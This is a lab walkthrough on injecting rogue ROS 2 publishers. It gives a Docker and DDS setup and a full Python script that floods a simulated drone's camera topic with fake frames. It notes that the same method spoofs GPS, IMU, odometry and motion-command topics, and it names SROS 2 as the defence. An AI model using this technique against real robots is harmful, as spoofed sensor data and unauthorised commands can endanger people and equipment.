# ROS 2 Rogue Publisher Injection

Inject synthetic sensor frames into the live ROS 2 graph by publishing to `/webcam/image_raw`.

**Category:** Injection

## Description

ROS 2 has no built-in publisher authentication. Any participant on the same domain that knows the topic name and message type can publish to it, and matching subscribers will accept the messages alongside the legitimate ones.

This walkthrough injects synthetic frames into `/webcam/image_raw` while Gazebo's legitimate camera plugin is also publishing. The two streams interleave at the subscriber, which is visually obvious in the RTSP feed (`rtsp://10.13.0.3:554/stream1`).

The same technique applies to any sensor topic. If the drone published GPS fix on `/gps/fix`, IMU on `/imu/data`, or odometry on `/odom`, you would just retarget the publisher — the attack mechanics are identical. The reason this works is that ROS 2 ships without authentication on the data plane; SROS 2 adds it but is rarely deployed in practice.

## Resources

- [ROS 2 Humble Docker Image](https://hub.docker.com/r/osrf/ros)
- [rclpy QoS profiles](https://docs.ros.org/en/humble/Concepts/About-Quality-of-Service-Settings.html)

## Solution Guide (Spoiler)

### Step 1. Stand up an attacker container on the simulator network

```sh
docker pull osrf/ros:humble-desktop
docker run -it --network=simulator --ip=10.13.0.10 \
    --name ros_humble_injector osrf/ros:humble-desktop bash
```

### Step 2. Join the lab's DDS graph

```sh
cat > /etc/cyclonedds.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<CycloneDDS xmlns="https://cdds.io/config">
  <Domain id="any">
    <General>
      <AllowMulticast>false</AllowMulticast>
    </General>
    <Discovery>
      <Peers>
        <Peer address="10.13.0.3"/>
        <Peer address="10.13.0.5"/>
      </Peers>
    </Discovery>
  </Domain>
</CycloneDDS>
EOF
export ROS_DOMAIN_ID=42
export RMW_IMPLEMENTATION=rmw_cyclonedds_cpp
export CYCLONEDDS_URI=file:///etc/cyclonedds.xml
source /opt/ros/humble/setup.bash
```

### Step 3. Confirm the topic and its QoS

```sh
ros2 topic info /webcam/image_raw -v
```

Note the QoS for the existing publisher (the `gazebo_ros` camera plugin). On the migration branch this will be `History: KEEP_LAST`, `Reliability: BEST_EFFORT`, `Durability: VOLATILE`. Your injector must publish at a compatible QoS — `BEST_EFFORT` reliability matches both `BEST_EFFORT` and `RELIABLE` subscribers, but `RELIABLE` publishers can't talk to `BEST_EFFORT` subscribers. The script below uses `qos_profile_sensor_data` which is exactly the legit profile.

### Step 4. Drop the injector script into the attacker container

```python
#!/usr/bin/env python3
import rclpy
from rclpy.node import Node
from rclpy.qos import qos_profile_sensor_data
from sensor_msgs.msg import Image

WIDTH, HEIGHT, RATE = 640, 480, 15.0


def make_payload():
    row = bytearray(WIDTH * 3)
    for x in range(WIDTH):
        if (x // 40) % 2 == 0:
            row[x * 3 + 2] = 255    # bright red
        else:
            row[x * 3 + 2] = 80     # dark red
    return bytes(row) * HEIGHT


class RoguePub(Node):
    def __init__(self):
        super().__init__('rogue_camera_publisher')
        self.pub = self.create_publisher(
            Image, '/webcam/image_raw', qos_profile_sensor_data
        )
        self.timer = self.create_timer(1.0 / RATE, self.tick)
        self.payload = make_payload()

    def tick(self):
        m = Image()
        m.header.frame_id = 'camera_link'
        m.height, m.width = HEIGHT, WIDTH
        m.encoding = 'bgr8'
        m.step = WIDTH * 3
        m.data = self.payload
        self.pub.publish(m)


def main():
    rclpy.init()
    node = RoguePub()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
```

### Step 5. Watch the legitimate stream, then run the injector

From your Kali host, start watching the RTSP feed:

```sh
ffplay rtsp://10.13.0.3:554/stream1
```

You should see the Gazebo world. Now in the attacker container:

```sh
python3 ros2_rogue_publisher.py
```

Within a second or two, the RTSP feed will start flickering between the legitimate Gazebo frames and the bright-red vertical-bar pattern. The frames are interleaving because both publishers are announcing to the same topic with compatible QoS.

### Step 6. Verify with `ros2 topic info`

```sh
ros2 topic info /webcam/image_raw -v
```

You should now see **two** publishers on the topic — the simulator and your rogue node.

## Why this works

ROS 2 inherits DDS's open-by-default trust model. A participant that knows the domain ID, topic name, message type, and matching QoS profile can publish — there is no certificate, no token, no signature check. The defence is SROS 2, which signs every participant's identity and lets the enclave specify allowed publish/subscribe topics — but **few production deployments actually enable it**, and even when they do, the keystore is often readable by anyone who pops a shell on the robot.

The same technique applies, unchanged, to:

- `/gps/fix` (`sensor_msgs/msg/NavSatFix`) — feed false position to a navigation stack
- `/imu/data` (`sensor_msgs/msg/Imu`) — induce bad attitude estimates
- `/odom` (`nav_msgs/msg/Odometry`) — confuse localisation
- Any custom command topic — issue motion commands the operator did not authorise
